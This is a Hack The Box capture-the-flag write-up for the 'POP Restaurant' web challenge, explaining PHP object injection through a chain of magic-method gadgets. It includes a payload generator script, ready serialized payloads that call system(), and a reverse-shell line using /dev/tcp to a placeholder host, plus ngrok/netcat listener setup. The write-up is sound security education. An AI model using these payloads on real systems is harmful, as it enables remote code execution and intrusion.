---
title: Pop Restaurant - Hack The Box
date: 2024-10-29
---

<script setup>
    import ChallengeCard from "../../../../../.vitepress/components/ChallengeCard.vue";
</script>

# POP Restaurant

![POP Restaurant - thumbnail](/ctf/hack-the-box/challenges/web/pop-restaurant/thumbnail.gif)

## Box description

*"Spent a week to create this food ordering system. Hope that it will not have any critical vulnerability in my
application."*

## Challenge description

In this web challenge, we’re presented with a simple food ordering system where users can register, log in, and select
from three different dishes to order. Each selected dish appears in the order list:

![POP Restaurant - orders](/ctf/hack-the-box/challenges/web/pop-restaurant/orders.png)

## Code Review

### index.php

In the `index.php` file, we see that ordering a dish involves submitting a **base64-encoded** serialized PHP object to
`order.php`.

```php
<form action="order.php" method="POST">
    <input type="hidden" name="data" value="<?php echo base64_encode(serialize(new Pizza())); ?>">
    <button type="submit" class="order__button">
        <img src="Static/Images/Pizza.gif" alt="Pizza">
        Order Pizza
    </button>
</form>
```

This form encodes an instance of the `Pizza` class, which is then serialized and sent to `order.php`. Upon receipt,
`order.php` decodes and unserializes the object, adding it to the list of orders.

::: details
Serialization is the process of converting an object into a format that can be stored or transmitted. In PHP, the
`serialize()` function converts an object into a string, while `unserialize()` does the reverse.

Serialized objects look like this:

```php
O:5:"Pizza":3:{s:5:"price";N;s:6:"cheese";N;s:4:"size";N;}
```
:::

### Vulnerable Models and Magic Methods

#### Pizza.php

```php
<?php

class Pizza
{
    public $price;
    public $cheese;
    public $size;

    public function __destruct()
    {
        echo $this->size->what;
    }
}
```

#### Spaghetti.php

```php
<?php

class Spaghetti
{
    public $sauce;
    public $noodles;
    public $portion;

    public function __get($tomato)
    {
        ($this->sauce)();
    }
}
```

#### IceCream.php

```php
<?php

class IceCream
{
    public $flavors;
    public $topping;

    public function __invoke()
    {
        foreach ($this->flavors as $flavor) {
            echo $flavor;
        }
    }
}
```

Each class includes **magic methods** that provide unique entry points for our exploit:

- **`__destruct()`** in `Pizza`: Executes when the object is destroyed.
- **`__get()`** in `Spaghetti`: Executes when an inaccessible or undefined property is accessed.
- **`__invoke()`** in `IceCream`: Executes when the object is called as a function.

### **ArrayHelpers.php**

```php
<?php

namespace Helpers {
    use \ArrayIterator;
	class ArrayHelpers extends ArrayIterator
	{
		public $callback;

		public function current()
		{
			$value = parent::current();
			$debug = call_user_func($this->callback, $value);
			return $value;
		}
	}
}
```

The `ArrayHelpers` class overrides the `current()` method in `ArrayIterator`, invoking `callback` on the current array
value. This behavior allows us to execute arbitrary code by setting `callback` to `system`.



## Exploitation

### Understanding the Exploit Chain

To exploit the **PHP unserialize vulnerability**, we will chain the classes as follows:

1. **ArrayHelpers**: Executes system commands via `callback`.
2. **IceCream**: Holds an `ArrayHelpers` instance in the `flavors` property.
3. **Spaghetti**: Holds the `IceCream` instance in the `sauce` property, triggering `__get()`.
4. **Pizza**: Holds the `Spaghetti` instance in the `size` property, invoking `__destruct()` when destroyed.

### Constructing the Exploit

#### Step-by-Step Payload Creation

To execute a system command, we will serialize the `Pizza` object and manipulate it with the `ArrayHelpers` callback.
Here’s the script to generate our payload:

```php
// Step 1: Create ArrayHelpers object and set the callback to 'system'
$arrayHelpers = new Helpers\ArrayHelpers();
$arrayHelpers->callback = 'system';

// Step 2: Append a command to execute ('whoami' for testing)
$arrayHelpers[] = 'whoami';

// Step 3: Assign ArrayHelpers to IceCream flavors property
$iceCream = new IceCream();
$iceCream->flavors = $arrayHelpers;

// Step 4: Set IceCream instance to Spaghetti's sauce property
$spaghetti = new Spaghetti();
$spaghetti->sauce = $iceCream;

// Step 5: Assign Spaghetti object to Pizza’s size property
$pizza = new Pizza();
$pizza->size = $spaghetti;

// Step 6: Serialize and Base64 encode the Pizza object
$serializedPizza = serialize($pizza);
$base64Payload = base64_encode($serializedPizza);

echo $base64Payload;
```

### Triggering the Payload on the Server

The server will unserialize the payload and attempt to execute `whoami`. While we may not see the output directly, we
can confirm command execution by creating a file or redirecting it to a reverse shell.

```php
O:5:"Pizza":3:{s:5:"price";N;s:6:"cheese";N;s:4:"size";O:9:"Spaghetti":3:{s:5:"sauce";O:8:"IceCream":2:{s:7:"flavors";O:20:"Helpers\ArrayHelpers":4:{i:0;i:0;i:1;a:2:{i:0;N;i:1;s:11:"touch hello";}i:2;a:1:{s:8:"callback";s:6:"system";}i:3;N;}s:7:"topping";N;}s:7:"noodles";N;s:7:"portion";N;}}
```

In the docker container, we can see the `hello` file created. This confirms that the command executed successfully.

## Reverse Shell Exploitation

To gain full control, we’ll establish a reverse shell by redirecting output to a remote listener.

1. **Set Up Reverse Shell Command**:

   ```php
   O:5:"Pizza":3:{s:5:"price";N;s:6:"cheese";N;s:4:"size";O:9:"Spaghetti":3:{s:5:"sauce";O:8:"IceCream":2:{s:7:"flavors";O:20:"Helpers\ArrayHelpers":4:{i:0;i:0;i:1;a:2:{i:0;N;i:1;s:50:"echo 'bash -i >& /dev/tcp/your-ip/port 0>&1' > shell.sh";}i:2;a:1:{s:8:"callback";s:6:"system";}i:3;N;}s:7:"topping";N;}s:7:"noodles";N;s:7:"portion";N;}}
   ```

2. **Execute the Shell Script**:

   ```php
   O:5:"Pizza":3:{s:5:"price";N;s:6:"cheese";N;s:4:"size";O:9:"Spaghetti":3:{s:5:"sauce";O:8:"IceCream":2:{s:7:"flavors";O:20:"Helpers\ArrayHelpers":4:{i:0;i:0;i:1;a:2:{i:0;N;i:1;s:13:"bash shell.sh";}i:2;a:1:{s:8:"callback";s:6:"system";}i:3;N;}s:7:"topping";N;}s:7:"noodles";N;s:7:"portion";N;}}
   ```

With a listener active, we connect to the server and confirm access.

## Retrieving the Flag

Once the reverse shell is established, navigate to the root directory and retrieve the flag:

```bash
www-data@pop-restaurant:/# cat pBhfMBQlu9uT_flag.txt
HTB{f4k3_fl4g_f0r_t35t1ng}
```

We now have the fake flag!

::: danger **Note for HTB Server**
Direct netcat connections to HTB IPs may not work. Use **ngrok** or similar tunneling tools to create a TCP tunnel to
your machine and connect with netcat.

```bash
ngrok tcp 12345
nc -lnv 12345
```

:::

<ChallengeCard
    challengeType="web"
    challengeName="POP Restaurant"
    htbCardLink="https://www.hackthebox.com/achievement/challenge/585215/770"
/>

## References

- [PHP Magic Methods](https://www.php.net/manual/en/language.oop5.magic.php)
- [PHP Object Serialization](https://www.php.net/manual/en/language.oop5.serialization.php)
- [PHP Object Injection](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)

<div style="display: flex; gap: 10px; justify-content: center;">
    <img src="/ctf/hack-the-box/challenges/web/pop-restaurant/pizza.gif" alt="Pizza" style="width: calc(100%/3); height: auto;" />
    <img src="/ctf/hack-the-box/challenges/web/pop-restaurant/ice-cream.gif" alt="Ice Cream" style="width: calc(100%/3); height: auto;" />
    <img src="/ctf/hack-the-box/challenges/web/pop-restaurant/spaghetti.png" alt="Spaghetti" style="width: calc(100%/3); height: auto;" />
</div>